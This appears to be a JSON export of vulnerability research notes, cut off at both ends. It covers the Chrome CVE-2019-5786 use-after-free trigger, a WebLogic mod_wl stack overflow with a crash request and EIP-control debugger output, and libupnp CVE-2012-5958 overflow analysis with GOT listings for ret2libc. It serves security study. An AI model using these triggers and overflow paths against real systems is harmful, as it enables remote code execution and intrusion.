great way to acheive that with JavaScript's `postMessage` method:\n\n```javascript\ntargetWindow.postMessage(message, targetOrigin, [transfer]);\n```\n\nThe `transfer` parameter is a sequence of Transferable objects that are transferred with the message. **The ownership of these objects is given to the desitnation side and they are no longer usable on the sending side.**\n\nBy doing so, we could pass multiple `DOMArrayBuffers` that refere to the same ArrayBuffer to a JS worker through postMessage in a `onprogress` event handler, for example:\n\n```javascript\n// last = reader ArrayBuffer result\n// lastlast = the previous result\nworker.postMessage([last], [last, lastlast]);\n```\n\nThis allows the first transfer to take ownership of its buffer, but the second transfer will fail because the `ArrayBuffer` has already been neutered. When this failure happens, this causes the transferred `ArrayBuffer` to be freed, while a reference still exists in the second `DOMArrayBuffer`.\n\n## Proof-of-Concept\n\nThanks to Istvan from Exodus, the community gets a clean proof-of-concept for testing purposes:\n\n<https://github.com/exodusintel/CVE-2019-5786>\n\n## 32-bit Windows 7\n\nOne of the reasons memory corruption bugs are much harder to exploit against Chrome is because the use of a custom memory allocator: ParitionAlloc. PartitionAlloc guarantees that different partitions exist in different regions of the process' address space, it also prevents various scenarios of linear overflows, object allocations, deferences, pointer overwrite, gard pages for large allocations.\n\nIt seems one of the limitations with ParitionAlloc is that although it effectively separates our ArrayBuffer from other kinds of allocations, and that it will never reuse those allocations, the scenario only applies if the region that is freed is below 2MiB in size. It is more possible to successfully reclaim the freed region on a 32-bit platform, which explains why a 32-bit Windows 7 is a much more ideal target for Chrome.\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "64796bac-0a1c-4980-b557-19a461dbf4b2",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "957310cf-4bd0-42f5-9281-6952e61636a6",
      "created": "2019-09-12T18:07:05.928637Z",
      "revisionDate": "2020-02-13T17:12:21.21266Z",
      "document": "\n\n## Details\n\nBea Weblogic 8.1 + Apache\nhttp://docs.oracle.com/cd/E13222_01/wls/docs81/plugins/apache.html\n\nFirst crash\n\n```\n(328.c38): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\WINDOWS\\system32\\RPCRT4.dll -\n*** WARNING: Unable to verify checksum for C:\\Program Files\\Apache Group\\Apache2\\modules\\mod_wl_20.so\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\Apache Group\\Apache2\\modules\\mod_wl_20.so -\neax=00000045 ebx=006a5d58 ecx=43434343 edx=7c90e4f4 esi=10013932 edi=000000a8\neip=77ea4126 esp=0280d7ec ebp=0280e818 iopl=0         ov up ei pl nz na po cy\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010a03\nRPCRT4!NdrVaryingArrayUnmarshall+0x81:\n77ea4126 008945107416    add     byte ptr [ecx+16741045h],cl ds:0023:59b75388=??\n0:132> .symfix\n0:132> .reload\nReloading current modules\n.............................................\n*** WARNING: Unable to verify checksum for C:\\Program Files\\Apache Group\\Apache2\\modules\\mod_wl_20.so\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\Apache Group\\Apache2\\modules\\mod_wl_20.so -\n0:132> kb\nChildEBP RetAddr  Args to Child\n0280e818 10001a8a 006a5d58 006b8ce0 0280fa38 RPCRT4!NdrVaryingArrayUnmarshall+0x82\n*** WARNING: Unable to verify checksum for C:\\Program Files\\Apache Group\\Apache2\\bin\\libhttpd.dll\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\Apache Group\\Apache2\\bin\\libhttpd.dll -\nWARNING: Stack unwind information not available. Following frames may be wrong.\n0280fef4 6ff0155f 006a5d58 006a1e28 006a5d58 mod_wl_20+0x1a8a\n0280ff08 6ff018a9 006a5d58 006a5d58 00000000 libhttpd!ap_run_handler+0x1f\n0280ff18 6ff0d97c 006a5d58 006a5d58 6ff097c6 libhttpd!ap_invoke_handler+0xa9\n00000000 00000000 00000000 00000000 00000000 libhttpd!ap_die+0x23c\n```\n\nMore controlled crash: length 4100\n\n```\nChildEBP RetAddr  Args to Child\nWARNING: Frame IP not in any known module. Following frames may be wrong.\n0440d7d4 41414141 54544820 2e312f50 000a0d31 0x41414141\n*** WARNING: Unable to verify checksum for C:\\Program Files\\Apache Group\\Apache2\\modules\\mod_wl_20.so\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\Apache Group\\Apache2\\modules\\mod_wl_20.so -\n0440e818 10001a8a 006a9388 0069cb20 0440fa38 0x41414141\n*** WARNING: Unable to verify checksum for C:\\Program Files\\Apache Group\\Apache2\\bin\\libhttpd.dll\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\Apache Group\\Apache2\\bin\\libhttpd.dll -\n0440fef4 6ff0155f 006a9388 0068dcf8 006a9388 mod_wl_20+0x1a8a\n0440ff08 6ff018a9 006a9388 006a9388 00000000 libhttpd!ap_run_handler+0x1f\n0440ff18 6ff0d97c 006a9388 006a9388 6ff097c6 libhttpd!ap_invoke_handler+0xa9\n00000000 00000000 00000000 00000000 00000000 libhttpd!ap_die+0x23c\n```\n\nmod_wl detection via nessus\n\nweblogic_mod_wl_overflow.nasl:    \"TITLE>Weblogic Bridge Message\" >< res[2] ||\n\n```\nPOST /index.jsp  HTTP/1.1\nHost: 192.168.1.130\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip, deflate\nProxy-Connection: keep-alive\nContent-Length: -1\n\nTML>\n<HEAD>\n<TITLE>Weblogic Bridge Message\n</TITLE>\n</HEAD>\n <BODY>\n<H2>Failure of server APACHE bridge:</H2><P>\n<hr><PRE>Internal Server failure, APACHE plugin.  Cannot continue.</PRE>\n<hr><BR><B>Build date/time:</B> <I>Jun 16 2006 15:14:11</I>\n<P><HR><B>Change Number:</B> <I>779586</I>\n </BODY>\n</HTML>\n<HTML>\n<HEAD>\n<TITLE>Weblogic Bridge Message\n```\n\nmod_wl overflow\n\n```\n.text:1000E751                 push    ecx             ; it should be HTTP/1.1 but.... failed :)\n.text:1000E752                 push    edx\n.text:1000E753                 mov     edx, [ebp+214h]\n.text:1000E759                 push    edx\n.text:1000E75A                 push    offset aSSS     ; \"%s %s %s\\r\\n\"\n.text:1000E75F                 push    eax             ; Dest\n.text:1000E760                 call    ds:sprintf      ; here is where overflow happends!\n```\n\nGET EIP on RET\n\n```\n0:244> p\neax=0000014a ebx=00691c28 ecx=41414141 edx=7c90e4f4 esi=0069cb20 edi=0440fa38\neip=1000edeb esp=0440c7b8 ebp=0440e818 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\nmod_wl_20+0xedeb:\n1000edeb 81c41c100000    add     esp,101Ch\n0:244> db esp\n0440c7b8  1f 00 00 00 16 00 00 00-00 00 00 00 4a 01 00 00  ............J...\n0440c7c8  48 6f 73 74 3a 20 31 39-32 2e 31 36 38 2e 31 2e  Host: 192.168.1.\n0440c7d8  31 33 30 0d 0a 55 73 65-72 2d 41 67 65 6e 74 3a  130..User-Agent:\n0440c7e8  20 4d 6f 7a 69 6c 6c 61-2f 34 2e 30 20 28 63 6f   Mozilla/4.0 (co\n0440c7f8  6d 70 61 74 69 62 6c 65-3b 20 4d 53 49 45 20 36  mpatible; MSIE 6\n0440c808  2e 30 3b 20 57 69 6e 64-6f 77 73 20 4e 54 20 35  .0; Windows NT 5\n0440c818  2e 31 29 0d 0a 43 6f 6e-74 65 6e 74 2d 54 79 70  .1)..Content-Typ\n0440c828  65 3a 20 61 70 70 6c 69-63 61 74 69 6f 6e 2f 78  e: application/x\n0:244> p\neax=0000014a ebx=00691c28 ecx=41414141 edx=7c90e4f4 esi=0069cb20 edi=0440fa38\neip=1000edf1 esp=0440d7d4 ebp=0440e818 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nmod_wl_20+0xedf1:\n1000edf1 c3              ret\n0:244> db esp\n0440d7d4  41 41 41 41 41 41 41 41-01 02 03 04 05 06 07 08  AAAAAAAA........\n0440d7e4  09 0b 0c 0e 0f 10 11 12-13 14 15 16 17 18 19 1a  ................\n0440d7f4  1b 1c 1d 1e 1f 20 21 22-23 24 25 26 27 28 29 2a  ..... !\"#$%&'()*\n0440d804  2b 2c 2d 2e 2f 30 31 32-33 34 35 36 37 38 39 3a  +,-./0123456789:\n0440d814  3b 3c 3d 3e 40 41 42 43-44 45 46 47 48 49 4a 4b  ;<=>@ABCDEFGHIJK\n0440d824  4c 4d 4e 4f 50 51 52 53-54 55 56 57 58 59 5a 5b  LMNOPQRSTUVWXYZ[\n0440d834  5c 5d 5e 5f 60 61 62 63-64 65 66 67 68 69 6a 6b  \\]^_`abcdefghijk\n0440d844  6c 6d 6e 6f 70 71 72 73-74 75 76 77 78 79 7a 7b  lmnopqrstuvwxyz{\n0:244> t\neax=0000014a ebx=00691c28 ecx=41414141 edx=7c90e4f4 esi=0069cb20 edi=0440fa38\neip=41414141 esp=0440d7d8 ebp=0440e818 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\n41414141 ??              ???\n```\n\n## References\n\nhttp://www.securityfocus.com/bid/30273/info\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "509c2509-506a-4e94-a0f2-ecc054ec348d",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "8f0e9a23-04d0-42b5-9735-9bc6a4d70879",
      "created": "2019-09-12T18:07:07.076144Z",
      "revisionDate": "2020-02-13T17:12:20.802772Z",
      "document": "\n\n* How unique_service_name is reached?00\n\n```\nBreakpoint 4, unique_service_name (\n    cmd=0x8053ad8 \"uuid:schemas:device:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9\"..., Evt=0xb57e6ca4) at src/ssdp/ssdp_server.c:496\n496\t    printf(\"[*] unique_service_name()\\n\");\n(gdb) bt\n#0  unique_service_name (\n    cmd=0x8053ad8 \"uuid:schemas:device:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9\"..., Evt=0xb57e6ca4) at src/ssdp/ssdp_server.c:496\n#1  0x0013464a in ssdp_request_type (\n    cmd=0x8053ad8 \"uuid:schemas:device:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9\"..., Evt=0xb57e7260) at src/ssdp/ssdp_server.c:624\n#2  0x001326c9 in ssdp_handle_device_request (hmsg=0x8051bb0, dest_addr=0x8051c8c) at src/ssdp/ssdp_device.c:127\n#3  0x001341e8 in ssdp_event_handler_thread (the_data=0x8051bb0) at src/ssdp/ssdp_server.c:787\n#4  0x0015f306 in WorkerThread (arg=0x15b340) at src/ThreadPool.c:533\n#5  0x0017596e in start_thread () from /lib/tls/i686/cmov/libpthread.so.0\n#6  0x00256a4e in clone () from /lib/tls/i686/cmov/libc.so.6\n```\n\n* CVE-2012-5958\n\nTempBuf Overflowed, at the current stack frame\n\n* CVE-2012-5959, CVE-2012-5961, CVE-2012-5962, CVE-2012-5963, CVE-2012-5964, CVE-2012-5965, CVE-2012-5960\n\nEvt members overflowed. Evt stored at the ssdp_handle_device_request frame:\n\n\tssdp_handle_device_request( IN http_message_t * hmsg, IN struct sockaddr_in *dest_addr )\n\n\tint handle;\n\tstruct Handle_Info *dev_info = NULL;\n\tmemptr hdr_value;\n\tint mx;\n\tchar save_char;\n\tSsdpEvent event; <==\n\tint ret_code;\n\tSsdpSearchReply *threadArg = NULL;\n\tThreadPoolJob job;\n\tint replyTime;\n\tint maxAge;\n\n* CVE-2012-5958, assuming no PIE for the main executable, which has been found in the wild, having into account\nwhich goodchars are from 0x01-0x7f or 0x80-0xff (with exceptions), doesn't seem feasible to use any of these\naddresses to make a type of ret2libc:\n\n(1) .got.plt for upnp_tv_device, the check program linked with libupnp (compiled on ubuntu 10.04 with\ngcc flags to disable stack-cookies and fortify libc checks)\n\n```\n.got.plt:0804F000 off_804F000     dd offset UpnpInit      ; DATA XREF: _UpnpInitr\n.got.plt:0804F004 off_804F004     dd offset sigemptyset   ; DATA XREF: _sigemptysetr\n.got.plt:0804F008 off_804F008     dd offset UpnpSendAdvertisement\n.got.plt:0804F008                                         ; DATA XREF: _UpnpSendAdvertisementr\n.got.plt:0804F00C off_804F00C     dd offset sprintf       ; DATA XREF: _sprintfr\n.got.plt:0804F010 off_804F010     dd offset ixmlPrintNode ; DATA XREF: _ixmlPrintNoder\n.got.plt:0804F014 off_804F014     dd offset ixmlNode_getNodeType\n.got.plt:0804F014                                         ; DATA XREF: _ixmlNode_getNodeTyper\n.got.plt:0804F018 off_804F018     dd offset __gmon_start__ ; DATA XREF: ___gmon_start__r\n.got.plt:0804F01C off_804F01C     dd offset __isoc99_sscanf ; DATA XREF: ___isoc99_sscanfr\n.got.plt:0804F020 off_804F020     dd offset UpnpUnRegisterRootDevice\n.got.plt:0804F020                                         ; DATA XREF: _UpnpUnRegisterRootDevicer\n.got.plt:0804F024 off_804F024     dd offset vsnprintf     ; DATA XREF: _vsnprintfr\n.got.plt:0804F028 off_804F028     dd offset ixmlNode_getFirstChild\n.got.plt:0804F028                                         ; DATA XREF: _ixmlNode_getFirstChildr\n.got.plt:0804F02C off_804F02C     dd offset fgets         ; DATA XREF: _fgetsr\n.got.plt:0804F030 off_804F030     dd offset ixmlNode_getNodeValue\n.got.plt:0804F030                                         ; DATA XREF: _ixmlNode_getNodeValuer\n.got.plt:0804F034 off_804F034     dd offset __libc_start_main\n.got.plt:0804F034                                         ; DATA XREF: ___libc_start_mainr\n.got.plt:0804F038 off_804F038     dd offset UpnpAddToActionResponse\n.got.plt:0804F038                                         ; DATA XREF: _UpnpAddToActionResponser\n.got.plt:0804F03C off_804F03C     dd offset ixmlNodeList_length\n.got.plt:0804F03C                                         ; DATA XREF: _ixmlNodeList_lengthr\n.got.plt:0804F040 off_804F040     dd offset UpnpGetServerIpAddress\n.got.plt:0804F040                                         ; DATA XREF: _UpnpGetServerIpAddressr\n.got.plt:0804F044 off_804F044     dd offset __assert_fail ; DATA XREF: ___assert_failr\n.got.plt:0804F048 off_804F048     dd offset pthread_mutexattr_setkind_np\n.got.plt:0804F048                                         ; DATA XREF: _pthread_mutexattr_setkind_npr\n.got.plt:0804F04C off_804F04C     dd offset UpnpAcceptSubscription\n.got.plt:0804F04C                                         ; DATA XREF: _UpnpAcceptSubscriptionr\n.got.plt:0804F050 off_804F050     dd offset UpnpResolveURL ; DATA XREF: _UpnpResolveURLr\n.got.plt:0804F054 off_804F054     dd offset sigwait       ; DATA XREF: _sigwaitr\n.got.plt:0804F058 off_804F058     dd offset strtol        ; DATA XREF: _strtolr\n.got.plt:0804F05C off_804F05C     dd offset free          ; DATA XREF: _freer\n.got.plt:0804F060 off_804F060     dd offset ixmlCloneDOMString\n.got.plt:0804F060                                         ; DATA XREF: _ixmlCloneDOMStringr\n.got.plt:0804F064 off_804F064     dd offset pthread_mutex_unlock\n.got.plt:0804F064                                         ; DATA XREF: _pthread_mutex_unlockr\n.got.plt:0804F068 off_804F068     dd offset UpnpGetServerPort\n.got.plt:0804F068                                         ; DATA XREF: _UpnpGetServerPortr\n.got.plt:0804F06C off_804F06C     dd offset pthread_mutexattr_destroy\n.got.plt:0804F06C                                         ; DATA XREF: _pthread_mutexattr_destroyr\n.got.plt:0804F070 off_804F070     dd offset ixmlNodeList_free\n.got.plt:0804F070                                         ; DATA XREF: _ixmlNodeList_freer\n.got.plt:0804F074 off_804F074     dd offset ixmlDocument_free\n.got.plt:0804F074                                         ; DATA XREF: _ixmlDocument_freer\n.got.plt:0804F078 off_804F078     dd offset strlen        ; DATA XREF: _strlenr\n.got.plt:0804F07C off_804F07C     dd offset pthread_mutex_destroy\n.got.plt:0804F07C                                         ; DATA XREF: _pthread_mutex_destroyr\n.got.plt:0804F080 off_804F080     dd offset strcpy        ; DATA XREF: _strcpyr\n.got.plt:0804F084 off_804F084     dd offset printf        ; DATA XREF: _printfr\n.got.plt:0804F088 off_804F088     dd offset pthread_mutex_init\n.got.plt:0804F088                                         ; DATA XREF: _pthread_mutex_initr\n.got.plt:0804F08C off_804F08C     dd offset strcasecmp    ; DATA XREF: _strcasecmpr\n.got.plt:0804F090 off_804F090     dd offset malloc        ; DATA XREF: _mallocr\n.got.plt:0804F094 off_804F094     dd offset pthread_mutex_lock\n.got.plt:0804F094                                         ; DATA XREF: _pthread_mutex_lockr\n.got.plt:0804F098 off_804F098     dd offset UpnpDownloadXmlDoc\n.got.plt:0804F098                                         ; DATA XREF: _UpnpDownloadXmlDocr\n.got.plt:0804F09C off_804F09C     dd offset UpnpSetWebServerRootDir\n.got.plt:0804F09C                                         ; DATA XREF: _UpnpSetWebServerRootDirr\n.got.plt:0804F0A0 off_804F0A0     dd offset pthread_create ; DATA XREF: _pthread_creater\n.got.plt:0804F0A4 off_804F0A4     dd offset sigaddset     ; DATA XREF: _sigaddsetr\n.got.plt:0804F0A8 off_804F0A8     dd offset ixmlElement_getElementsByTagName\n.got.plt:0804F0A8                                         ; DATA XREF: _ixmlElement_getElementsByTagNamer\n.got.plt:0804F0AC off_804F0AC     dd offset UpnpFinish    ; DATA XREF: _UpnpFinishr\n.got.plt:0804F0B0 off_804F0B0     dd offset UpnpRegisterRootDevice\n.got.plt:0804F0B0                                         ; DATA XREF: _UpnpRegisterRootDevicer\n.got.plt:0804F0B4 off_804F0B4     dd offset UpnpNotify    ; DATA XREF: _UpnpNotifyr\n.got.plt:0804F0B8 off_804F0B8     dd offset ixmlNodeList_item\n.got.plt:0804F0B8                                         ; DATA XREF: _ixmlNodeList_itemr\n.got.plt:0804F0BC off_804F0BC     dd offset snprintf      ; DATA XREF: _snprintfr\n.got.plt:0804F0C0 off_804F0C0     dd offset pthread_mutexattr_init\n.got.plt:0804F0C0                                         ; DATA XREF: _pthread_mutexattr_initr\n.got.plt:0804F0C4 off_804F0C4     dd offset strcmp        ; DATA XREF: _strcmpr\n.got.plt:0804F0C8 off_804F0C8     dd offset __strdup      ; DATA XREF: ___strdupr\n.got.plt:0804F0CC off_804F0CC     dd offset exit          ; DATA XREF: _exitr\n.got.plt:0804F0D0 off_804F0D0     dd offset ixmlFreeDOMString\n.got.plt:0804F0D0                                         ; DATA XREF: _ixmlFreeDOMStringr\n.got.plt:0804F0D4 off_804F0D4     dd offset ixmlDocument_getElementsByTagName\n.got.plt:0804F0D4                                         ; DATA XREF: _ixmlDocument_getElementsByTagNamer\n.got.plt:0804F0D4 _got_plt        ends\n.got.plt:0804F0D4\n```\n\n* For the dms executable\n\n```\n.got.plt:080BA208 off_80BA208     dd offset __cxa_end_catch ; DATA XREF: ___cxa_end_catchr\n.got.plt:080BA20C off_80BA20C     dd offset __cxa_rethrow ; DATA XREF: ___cxa_rethrowr\n.got.plt:080BA210 off_80BA210     dd offset _ZN11MediaServer15GetAbsolutePathERKSs\n.got.plt:080BA210                                         ; DATA XREF: MediaServer::GetAbsolutePath(std::string  const&)r\n.got.plt:080BA210                                         ; MediaServer::GetAbsolutePath(std::string  const&)\n.got.plt:080BA214 off_80BA214     dd offset _ZN14SynoAudioUtils25RadioGetGenreStationCountEj\n.got.plt:080BA214                                         ; DATA XREF: SynoAudioUtils::RadioGetGenreStationCount(uint)r\n.got.plt:080BA214                                         ; SynoAudioUtils::RadioGetGenreStationCount(uint)\n.got.plt:080BA218 off_80BA218     dd offset UpnpInit      ; DATA XREF: _UpnpInitr\n.got.plt:080BA21C off_80BA21C     dd offset UpnpSetVirtualDirCallbacks\n.got.plt:080BA21C                                         ; DATA XREF: _UpnpSetVirtualDirCallbacksr\n.got.plt:080BA220 off_80BA220     dd offset mkdir         ; DATA XREF: _mkdirr\n.got.plt:080BA224 off_80BA224     dd offset pthread_getspecific\n.got.plt:080BA224                                         ; DATA XREF: _pthread_getspecificr\n.got.plt:080BA228 off_80BA228     dd offset _ZN11MediaServer7MediaDB12AddConditionERKSs\n.got.plt:080BA228                                         ; DATA XREF: MediaServer::MediaDB::AddCondition(std::string  const&)r\n.got.plt:080BA228                                         ; MediaServer::MediaDB::AddCondition(std::string  const&)\n.got.plt:080BA22C off_80BA22C     dd offset _ZN11MediaServer15DMSStringBundle9TranslateERKSs\n.got.plt:080BA22C                                         ; DATA XREF: MediaServer::DMSStringBundle::Translate(std::string  const&)r\n.got.plt:080BA22C                                         ; MediaServer::DMSStringBundle::Translate(std::string  const&)\n.got.plt:080BA230 off_80BA230     dd offset ixmlNode_getFirstChild\n.got.plt:080BA230                                         ; DATA XREF: _ixmlNode_getFirstChildr\n.got.plt:080BA234 off_80BA234     dd offset _ZN11MediaServer7MediaDB10FetchFieldEPKc\n.got.plt:080BA234                                         ; DATA XREF: MediaServer::MediaDB::FetchField(char  const*)r\n.got.plt:080BA234                                         ; MediaServer::MediaDB::FetchField(char  const*)\n.got.plt:080BA238 off_80BA238     dd offset _ZN11MediaServer18DMSGetThumbnailResEiiPiS0_i\n.got.plt:080BA238                                         ; DATA XREF: MediaServer::DMSGetThumbnailRes(int,int,int *,int *,int)r\n.got.plt:080BA238                                         ; MediaServer::DMSGetThumbnailRes(int,int,int *,int *,int)\n.got.plt:080BA23C off_80BA23C     dd offset _ZNSt8ios_base4InitC1Ev\n.got.plt:080BA23C                                         ; DATA XREF: std::ios_base::Init::Init(void)r\n.got.plt:080BA23C                                         ; std::ios_base::Init::Init(void)\n.got.plt:080BA240 off_80BA240     dd offset strchr        ; DATA XREF: _strchrr\n.got.plt:080BA244 off_80BA244     dd offset _ZN11MediaServer21XMLGetElmentTextValueEP10_IXML_Node\n.got.plt:080BA244                                         ; DATA XREF: MediaServer::XMLGetElmentTextValue(_IXML_Node *)r\n.got.plt:080BA244                                         ; MediaServer::XMLGetElmentTextValue(_IXML_Node *)\n.got.plt:080BA248 off_80BA248     dd offset _ZN11MediaServer19DMSGetProductSerialEv\n.got.plt:080BA248                                         ; DATA XREF: MediaServer::DMSGetProductSerial(void)r\n.got.plt:080BA248                                         ; MediaServer::DMSGetProductSerial(void)\n.got.plt:080BA24C off_80BA24C     dd offset _ZN4Json18StyledStreamWriterC1ESs\n.got.plt:080BA24C                                         ; DATA XREF: Json::StyledStreamWriter::StyledStreamWriter(std::string)r\n.got.plt:080BA24C                                         ; Json::StyledStreamWriter::StyledStreamWriter(std::string)\n.got.plt:080BA250 off_80BA250     dd offset _ZNKSs13find_first_ofEPKcjj\n.got.plt:080BA250                                         ; DATA XREF: std::string::find_first_of(char  const*,uint,uint)r\n.got.plt:080BA250                                         ; std::string::find_first_of(char  const*,uint,uint)\n.got.plt:080BA254 off_80BA254     dd offset _ZN14SynoAudioUtils17RadioGetGenreDataEjRNS_10RadioGenreE\n.got.plt:080BA254                                         ; DATA XREF: SynoAudioUtils::RadioGetGenreData(uint,SynoAudioUtils::RadioGenre &)r\n.got.plt:080BA254                                         ; SynoAudioUtils::RadioGetGenreData(uint,SynoAudioUtils::RadioGenre &)\n.got.plt:080BA258 off_80BA258     dd offset _ZN4Json5ValueC1ENS_9ValueTypeE\n.got.plt:080BA258                                         ; DATA XREF: Json::Value::Value(Json::ValueType)r\n.got.plt:080BA258                                         ; Json::Value::Value(Json::ValueType)\n.got.plt:080BA25C off_80BA25C     dd offset _ZNSt6localeD1Ev\n.got.plt:080BA25C                                         ; DATA XREF: std::locale::~locale()r\n.got.plt:080BA25C                                         ; std::locale::~locale()\n.got.plt:080BA260 off_80BA260     dd offset getopt_long_only ; DATA XREF: _getopt_long_onlyr\n.got.plt:080BA264 off_80BA264     dd offset _ZNKSs5rfindEPKcjj\n.got.plt:080BA264                                         ; DATA XREF: std::string::rfind(char  const*,uint,uint)r\n.got.plt:080BA264                                         ; std::string::rfind(char  const*,uint,uint)\n.got.plt:080BA268 off_80BA268     dd offset getpid        ; DATA XREF: _getpidr\n.got.plt:080BA26C off_80BA26C     dd offset _ZN7pcrecpp2RE4InitERKSsPKNS_10RE_OptionsE\n.got.plt:080BA26C                                         ; DATA XREF: pcrecpp::RE::Init(std::string  const&,pcrecpp::RE_Options  const*)r\n.got.plt:080BA26C                                         ; pcrecpp::RE::Init(std::string  const&,pcrecpp::RE_Options  const*)\n.got.plt:080BA270 off_80BA270     dd offset strdup        ; DATA XREF: _strdupr\n.got.plt:080BA274 off_80BA274     dd offset appendPQExpBuffer\n.got.plt:080BA274                                         ; DATA XREF: _appendPQExpBufferr\n.got.plt:080BA278 off_80BA278     dd offset _ZN11MediaServer15DMSStringBundleC1ERKSs\n.got.plt:080BA278                                         ; DATA XREF: MediaServer::DMSStringBundle::DMSStringBundle(std::string  const&)r\n.got.plt:080BA278                                         ; MediaServer::DMSStringBundle::DMSStringBundle(std::string  const&)\n.got.plt:080BA27C off_80BA27C     dd offset _ZN11MediaServer13DMSClientList4LoadERKSsS2_\n.got.plt:080BA27C                                         ; DATA XREF: MediaServer::DMSClientList::Load(std::string  const&,std::string  const&)r\n.got.plt:080BA27C                                         ; MediaServer::DMSClientList::Load(std::string  const&,std::string  const&)\n.got.plt:080BA280 off_80BA280     dd offset SYNODlnaContainerTypeGet\n.got.plt:080BA280                                         ; DATA XREF: _SYNODlnaContainerTypeGetr\n.got.plt:080BA284 off_80BA284     dd offset UpnpRegisterClient\n.got.plt:080BA284                                         ; DATA XREF: _UpnpRegisterClientr\n.got.plt:080BA288 off_80BA288     dd offset UpnpSearchAsync ; DATA XREF: _UpnpSearchAsyncr\n.got.plt:080BA28C off_80BA28C     dd offset write         ; DATA XREF: _writer\n.got.plt:080BA290 off_80BA290     dd offset strcmp        ; DATA XREF: _strcmpr\n.got.plt:080BA294 off_80BA294     dd offset _ZN14SynoAudioUtils15SmartPLSGetNameEi\n.got.plt:080BA294                                         ; DATA XREF: SynoAudioUtils::SmartPLSGetName(int)r\n.got.plt:080BA294                                         ; SynoAudioUtils::SmartPLSGetName(int)\n.got.plt:080BA298 off_80BA298     dd offset _ZNSt8ios_baseC2Ev\n.got.plt:080BA298                                         ; DATA XREF: std::ios_base::ios_base(void)r\n.got.plt:080BA298                                         ; std::ios_base::ios_base(void)\n.got.plt:080BA29C off_80BA29C     dd offset _ZN11MediaServer13DMSClientList11EraseObjectERKSs\n.got.plt:080BA29C                                         ; DATA XREF: MediaServer::DMSClientList::EraseObject(std::string  const&)r\n.got.plt:080BA29C                                         ; MediaServer::DMSClientList::EraseObject(std::string  const&)\n.got.plt:080BA2A0 off_80BA2A0     dd offset close         ; DATA XREF: _closer\n.got.plt:080BA2A4 off_80BA2A4     dd offset SYNODBClose   ; DATA XREF: destr_function:_SYNODBCloser\n.got.plt:080BA2A8 off_80BA2A8     dd offset _ZNSt13basic_filebufIcSt11char_traitsIcEE5closeEv\n.got.plt:080BA2A8                                         ; DATA XREF: std::basic_filebuf<char,std::char_traits<char>>::close(void)r\n.got.plt:080BA2A8                                         ; std::basic_filebuf<char,std::char_traits<char>>::close(void)\n.got.plt:080BA2AC off_80BA2AC     dd offset _ZN14SynoAudioUtils18RadioGetGenreCountEv\n.got.plt:080BA2AC                                         ; DATA XREF: SynoAudioUtils::RadioGetGenreCount(void)r\n.got.plt:080BA2AC                                         ; SynoAudioUtils::RadioGetGenreCount(void)\n.got.plt:080BA2B0 off_80BA2B0     dd offset _ZN11MediaServer16DMSGetProductUDNEv\n.got.plt:080BA2B0                                         ; DATA XREF: MediaServer::DMSGetProductUDN(void)r\n.got.plt:080BA2B0                                         ; MediaServer::DMSGetProductUDN(void)\n.got.plt:080BA2B4 off_80BA2B4     dd offset fprintf       ; DATA XREF: _fprintfr\n.got.plt:080BA2B8 off_80BA2B8     dd offset SYNOAacObjectTypeGet\n.got.plt:080BA2B8                                         ; DATA XREF: _SYNOAacObjectTypeGetr\n.got.plt:080BA2BC off_80BA2BC     dd offset pcre_fullinfo ; DATA XREF: _pcre_fullinfor\n.got.plt:080BA2C0 off_80BA2C0     dd offset signal        ; DATA XREF: _signalr\n.got.plt:080BA2C4 off_80BA2C4     dd offset UpnpSendAdvertisement\n.got.plt:080BA2C4                                         ; DATA XREF: _UpnpSendAdvertisementr\n.got.plt:080BA2C8 off_80BA2C8     dd offset _ZN11MediaServer7MediaDB15FetchFieldAsIntEPKc\n.got.plt:080BA2C8                                         ; DATA XREF: MediaServer::MediaDB::FetchFieldAsInt(char  